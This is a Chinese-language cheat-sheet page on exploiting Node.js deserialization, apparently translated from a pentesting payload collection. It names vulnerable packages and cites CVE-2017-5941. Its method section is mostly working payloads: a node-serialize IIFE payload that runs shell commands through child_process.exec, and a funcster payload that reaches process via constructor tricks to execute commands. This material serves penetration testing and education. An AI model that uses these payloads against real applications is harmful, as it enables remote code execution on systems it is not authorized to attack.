# 节点反序列化

> Node.js 反序列化是指从序列化格式（如 JSON、BSON 或其他表示结构化数据的格式）重建 JavaScript 对象的过程。在 Node.js 应用程序中，序列化和反序列化通常用于数据存储、缓存和进程间通信。

## 概述

* [方法论](#方法论)
    * [node-serialize](#node-serialize)
    * [funcster](#funcster)
* [参考文献](#参考文献)

## 方法论

* 在 Node 源代码中查找以下内容：

    * `node-serialize`
    * `serialize-to-js`
    * `funcster`

### node-serialize

> 在 Node.js 的 node-serialize 包 0.0.4 中发现了一个问题。通过向 `unserialize()` 函数传递不受信任的数据，可以利用一个带有立即执行函数表达式（IIFE）的 JavaScript 对象来实现任意代码执行。

1. 生成序列化的有效负载

    ```js
    var y = {
        rce : function(){
            require('child_process').exec('ls /', function(error,
            stdout, stderr) { console.log(stdout) });
        },
    }
    var serialize = require('node-serialize');
    console.log("Serialized: \n" + serialize.serialize(y));
    ```

2. 添加括号 `()` 强制执行

    ```js
    {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}
    ```

3. 发送有效负载

### funcster

```js
{"rce":{"__js_function":"function(){CMD=\"cmd /c calc\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()"}}
```

## 参考文献

* [CVE-2017-5941 - 国家漏洞数据库 - 2017 年 2 月 9 日](https://nvd.nist.gov/vuln/detail/CVE-2017-5941)
* [利用 Node.js 反序列化漏洞进行远程代码执行 (CVE-2017-5941) - Ajin Abraham - 2018 年 10 月 31 日](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)
* [NodeJS 反序列化 - gonczor - 2020 年 1 月 8 日](https://blacksheephacks.pl/nodejs-deserialization/)